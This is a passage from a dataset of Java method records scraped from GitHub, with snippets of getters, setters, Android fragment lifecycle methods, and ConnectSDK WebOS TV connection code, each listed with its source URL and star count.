"https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34573, "method_name": "setParameter", "class_name": "DataSourceModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setParameter(String parameter) {\n        this.parameterMap = null;\n        this.parameter = parameter;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34574, "method_name": "getId", "class_name": "DataSourceModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34575, "method_name": "setId", "class_name": "DataSourceModel", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(int id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34576, "method_name": "getModelName", "class_name": "DataSourceModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getModelName() {\n        return modelName;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34577, "method_name": "setModelName", "class_name": "DataSourceModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setModelName(String modelName) {\n        this.modelName = modelName;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34578, "method_name": "getModelDesc", "class_name": "DataSourceModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getModelDesc() {\n        return modelDesc;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34579, "method_name": "setModelDesc", "class_name": "DataSourceModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setModelDesc(String modelDesc) {\n        this.modelDesc = modelDesc;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34580, "method_name": "getSourceType", "class_name": "DataSourceModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSourceType() {\n        return sourceType;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34581, "method_name": "setSourceType", "class_name": "DataSourceModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSourceType(String sourceType) {\n        this.sourceType = sourceType;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34582, "method_name": "getCreateTime", "class_name": "DataSourceModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getCreateTime() {\n        return createTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34583, "method_name": "setCreateTime", "class_name": "DataSourceModel", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreateTime(Date createTime) {\n        this.createTime = createTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34584, "method_name": "getCreateUser", "class_name": "DataSourceModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCreateUser() {\n        return createUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34585, "method_name": "setCreateUser", "class_name": "DataSourceModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreateUser(String createUser) {\n        this.createUser = createUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34586, "method_name": "getModifyUser", "class_name": "DataSourceModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getModifyUser() {\n        return modifyUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34587, "method_name": "setModifyUser", "class_name": "DataSourceModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setModifyUser(String modifyUser) {\n        this.modifyUser = modifyUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34588, "method_name": "getModifyTime", "class_name": "DataSourceModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getModifyTime() {\n        return modifyTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34589, "method_name": "setModifyTime", "class_name": "DataSourceModel", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setModifyTime(Date modifyTime) {\n        this.modifyTime = modifyTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34590, "method_name": "getParameterMap", "class_name": "DataSourceModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "    public Map<String, Object> getParameterMap() {\n        return parameterMap;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34591, "method_name": "setParameterMap", "class_name": "DataSourceModel", "params": ["Map<String,Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setParameterMap(Map<String, Object> parameterMap) {\n        this.parameterMap = parameterMap;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34592, "method_name": "toString", "class_name": "DataSourceModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString(){\n        return \"\";\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34593, "method_name": "getCreateOwner", "class_name": "DataSourceModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCreateOwner() {\n        return createOwner;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34594, "method_name": "setCreateOwner", "class_name": "DataSourceModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreateOwner(String createOwner) {\n        this.createOwner = createOwner;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34595, "method_name": "getAuthScopes", "class_name": "DataSourceModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "    public List<String> getAuthScopes() {\n        return authScopes;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34596, "method_name": "setAuthScopes", "class_name": "DataSourceModel", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAuthScopes(List<String> authScopes) {\n        this.authScopes = authScopes;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceModel.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34597, "method_name": "getItemViewType", "class_name": "GroupableItemsViewAdapter_2", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getItemViewType (int p0)\n\t{\n\t\treturn n_getItemViewType (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/GroupableItemsViewAdapter_2.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34598, "method_name": "n_getItemViewType", "class_name": "GroupableItemsViewAdapter_2", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "int", "snippet": "\tprivate native int n_getItemViewType (int p0);\n\n\n\tpublic android.support.v7.widget.RecyclerView.ViewHolder onCreateViewHolder (android.view.ViewGroup p0, int p1)\n\t{\n\t\treturn n_onCreateViewHolder (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/GroupableItemsViewAdapter_2.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34599, "method_name": "onCreateViewHolder", "class_name": "GroupableItemsViewAdapter_2", "params": ["android", "int"], "throws": null, "modifiers": ["public"], "return_type": "android", "snippet": "\tpublic android.support.v7.widget.RecyclerView.ViewHolder onCreateViewHolder (android.view.ViewGroup p0, int p1)\n\t{\n\t\treturn n_onCreateViewHolder (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/GroupableItemsViewAdapter_2.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34600, "method_name": "n_onCreateViewHolder", "class_name": "GroupableItemsViewAdapter_2", "params": ["android", "int"], "throws": null, "modifiers": ["private", "native"], "return_type": "android", "snippet": "\tprivate native android.support.v7.widget.RecyclerView.ViewHolder n_onCreateViewHolder (android.view.ViewGroup p0, int p1);\n\n\n\tpublic void onBindViewHolder (android.support.v7.widget.RecyclerView.ViewHolder p0, int p1)\n\t{\n\t\tn_onBindViewHolder (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/GroupableItemsViewAdapter_2.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34601, "method_name": "onBindViewHolder", "class_name": "GroupableItemsViewAdapter_2", "params": ["android", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onBindViewHolder (android.support.v7.widget.RecyclerView.ViewHolder p0, int p1)\n\t{\n\t\tn_onBindViewHolder (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/GroupableItemsViewAdapter_2.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34602, "method_name": "n_onBindViewHolder", "class_name": "GroupableItemsViewAdapter_2", "params": ["android", "int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onBindViewHolder (android.support.v7.widget.RecyclerView.ViewHolder p0, int p1);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/GroupableItemsViewAdapter_2.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34603, "method_name": "monodroidAddReference", "class_name": "GroupableItemsViewAdapter_2", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/GroupableItemsViewAdapter_2.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34604, "method_name": "monodroidClearReferences", "class_name": "GroupableItemsViewAdapter_2", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/GroupableItemsViewAdapter_2.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34605, "method_name": "newInstance", "class_name": "ImageDetailFragment", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "ImageDetailFragment", "snippet": "    public static ImageDetailFragment newInstance(String imageUrl) {\n        final ImageDetailFragment f = new ImageDetailFragment();\n\n        final Bundle args = new Bundle();\n        args.putString(IMAGE_DATA_EXTRA, imageUrl);\n        f.setArguments(args);\n\n        return f;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/displayingbitmaps/ui/ImageDetailFragment.java", "stars": "74", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 34606, "method_name": "onCreate", "class_name": "ImageDetailFragment", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        mImageUrl = getArguments() != null ? getArguments().getString(IMAGE_DATA_EXTRA) : null;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/displayingbitmaps/ui/ImageDetailFragment.java", "stars": "74", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 34607, "method_name": "onCreateView", "class_name": "ImageDetailFragment", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(LayoutInflater inflater, ViewGroup container,\n            Bundle savedInstanceState) {\n        // Inflate and locate the main ImageView\n        final View v = inflater.inflate(R.layout.image_detail_fragment, container, false);\n        mImageView = (ImageView) v.findViewById(R.id.imageView);\n        return v;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/displayingbitmaps/ui/ImageDetailFragment.java", "stars": "74", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 34608, "method_name": "onActivityCreated", "class_name": "ImageDetailFragment", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onActivityCreated(Bundle savedInstanceState) {\n        super.onActivityCreated(savedInstanceState);\n\n        // Use the parent activity to load the image asynchronously into the ImageView (so a single\n        // cache can be used over all pages in the ViewPager\n        if (ImageDetailActivity.class.isInstance(getActivity())) {\n            mImageFetcher = ((ImageDetailActivity) getActivity()).getImageFetcher();\n            mImageFetcher.loadImage(mImageUrl, mImageView);\n        }\n\n        // Pass clicks on the ImageView to the parent activity to handle\n        if (OnClickListener.class.isInstance(getActivity()) && Utils.hasHoneycomb()) {\n            mImageView.setOnClickListener((OnClickListener) getActivity());\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/displayingbitmaps/ui/ImageDetailFragment.java", "stars": "74", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 34609, "method_name": "onDestroy", "class_name": "ImageDetailFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDestroy() {\n        super.onDestroy();\n        if (mImageView != null) {\n            // Cancel any pending image work\n            ImageWorker.cancelWork(mImageView);\n            mImageView.setImageDrawable(null);\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ImageGridActivity/src/com/example/android/displayingbitmaps/ui/ImageDetailFragment.java", "stars": "74", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 34610, "method_name": "getInfo", "class_name": "SimpleNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "  public T getInfo() {\n    return info;\n  }", "url": "https://raw.githubusercontent.com/FabianCristancho/Grammatical-Tree-LF/master/src/model/SimpleNode.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34611, "method_name": "setInfo", "class_name": "SimpleNode", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setInfo(T info) {\n    this.info = info;\n  }", "url": "https://raw.githubusercontent.com/FabianCristancho/Grammatical-Tree-LF/master/src/model/SimpleNode.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34612, "method_name": "getNext", "class_name": "SimpleNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SimpleNode<T>", "snippet": "  public SimpleNode<T> getNext() {\n    return next;\n  }", "url": "https://raw.githubusercontent.com/FabianCristancho/Grammatical-Tree-LF/master/src/model/SimpleNode.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34613, "method_name": "setNext", "class_name": "SimpleNode", "params": ["SimpleNode<T>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setNext(SimpleNode<T> next) {\n    this.next = next;\n  }", "url": "https://raw.githubusercontent.com/FabianCristancho/Grammatical-Tree-LF/master/src/model/SimpleNode.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34614, "method_name": "startActivity", "class_name": "TVUpdateActivity", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "Intent", "snippet": "\tpublic static Intent startActivity(Context context) {\n\t\tIntent intent = new Intent(context, TVUpdateActivity.class);\n\t\tcontext.startActivity(intent);\n\t\treturn intent;\n\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVUpdateActivity.java", "stars": "4", "class_props": {"extends": "TVBaseActivity", "implements": null, "modifiers": ["public"]}}, {"id": 34615, "method_name": "onCreate", "class_name": "TVUpdateActivity", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void onCreate(Bundle savedInstanceState) {\n\t\tTVButterApplication.getAppContext()\n\t\t\t\t.getComponent()\n\t\t\t\t.inject(this);\n\t\tsuper.onCreate(savedInstanceState, R.layout.activity_update);\n\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVUpdateActivity.java", "stars": "4", "class_props": {"extends": "TVBaseActivity", "implements": null, "modifiers": ["public"]}}, {"id": 34616, "method_name": "setPairingType", "class_name": "WebOSTVService", "params": ["PairingType"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPairingType(PairingType pairingType) {\n        this.pairingType = pairingType;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34617, "method_name": "getPriorityLevel", "class_name": "WebOSTVService", "params": ["Class<CapabilityMethods>"], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getPriorityLevel(Class<? extends CapabilityMethods> clazz) {\n        if (clazz.equals(MediaPlayer.class)) {\n            return getMediaPlayerCapabilityLevel();\n        }\n        else if (clazz.equals(MediaControl.class)) {\n            return getMediaControlCapabilityLevel();\n        }\n        else if (clazz.equals(Launcher.class)) {\n            return getLauncherCapabilityLevel();\n        }\n        else if (clazz.equals(TVControl.class)) {\n            return getTVControlCapabilityLevel();\n        }\n        else if (clazz.equals(VolumeControl.class)) {\n            return getVolumeControlCapabilityLevel();\n        }\n        else if (clazz.equals(ExternalInputControl.class)) {\n            return getExternalInputControlPriorityLevel();\n        }\n        else if (clazz.equals(MouseControl.class)) {\n            return getMouseControlCapabilityLevel();\n        }\n        else if (clazz.equals(TextInputControl.class)) {\n            return getTextInputControlCapabilityLevel();\n        }\n        else if (clazz.equals(PowerControl.class)) {\n            return getPowerControlCapabilityLevel();\n        }\n        else if (clazz.equals(KeyControl.class)) {\n            return getKeyControlCapabilityLevel();\n        }\n        else if (clazz.equals(ToastControl.class)) {\n            return getToastControlCapabilityLevel();\n        }\n        else if (clazz.equals(WebAppLauncher.class)) {\n            return getWebAppLauncherCapabilityLevel();\n        }\n        else if (clazz.equals(PlaylistControl.class)) {\n            return getPlaylistControlCapabilityLevel();\n        }\n        return CapabilityPriorityLevel.NOT_SUPPORTED;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34618, "method_name": "setServiceDescription", "class_name": "WebOSTVService", "params": ["ServiceDescription"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setServiceDescription(ServiceDescription serviceDescription) {\n        super.setServiceDescription(serviceDescription);\n\n        if (this.serviceDescription.getVersion() == null && this.serviceDescription.getResponseHeaders() != null)\n        {\n            String serverInfo = serviceDescription.getResponseHeaders().get(\"Server\").get(0);\n            String systemOS = serverInfo.split(\" \")[0];\n            String[] versionComponents = systemOS.split(\"/\");\n            String systemVersion = versionComponents[versionComponents.length - 1];\n\n            this.serviceDescription.setVersion(systemVersion);\n\n            this.updateCapabilities();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34619, "method_name": "getDLNAService", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["private"], "return_type": "DeviceService", "snippet": "    private DeviceService getDLNAService() {\n        Map<String, ConnectableDevice> allDevices = DiscoveryManager.getInstance().getAllDevices();\n        ConnectableDevice device = null;\n        DeviceService service = null;\n\n        if (allDevices != null && allDevices.size() > 0)\n            device = allDevices.get(this.serviceDescription.getIpAddress());\n\n        if (device != null)\n            service = device.getServiceByName(\"DLNA\");\n\n        return service;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34620, "method_name": "discoveryFilter", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "DiscoveryFilter", "snippet": "    public static DiscoveryFilter discoveryFilter() {\n        return new DiscoveryFilter(ID, \"urn:lge-com:service:webos-second-screen:1\");\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34621, "method_name": "isConnected", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isConnected() {\n        if (DiscoveryManager.getInstance().getPairingLevel() == PairingLevel.ON) {\n            return this.socket != null && this.socket.isConnected() && (((WebOSTVServiceConfig)serviceConfig).getClientKey() != null);\n        } else {\n            return this.socket != null && this.socket.isConnected();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34622, "method_name": "connect", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void connect() {\n        if (this.socket == null) {\n            this.socket = new WebOSTVServiceSocketClient(this, WebOSTVServiceSocketClient.getURI(this));\n            this.socket.setListener(mSocketListener);\n        }\n\n        if (!this.isConnected())\n            this.socket.connect();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34623, "method_name": "disconnect", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void disconnect() {\n        Log.d(Util.T, \"attempting to disconnect to \" + serviceDescription.getIpAddress());\n\n        Util.runOnUI(new Runnable() {\n\n            @Override\n            public void run() {\n                if (listener != null)\n                    listener.onDisconnect(WebOSTVService.this, null);\n            }\n        });\n\n        if (socket != null) {\n            socket.setListener(null);\n            socket.disconnect();\n            socket = null;\n        }\n\n        if 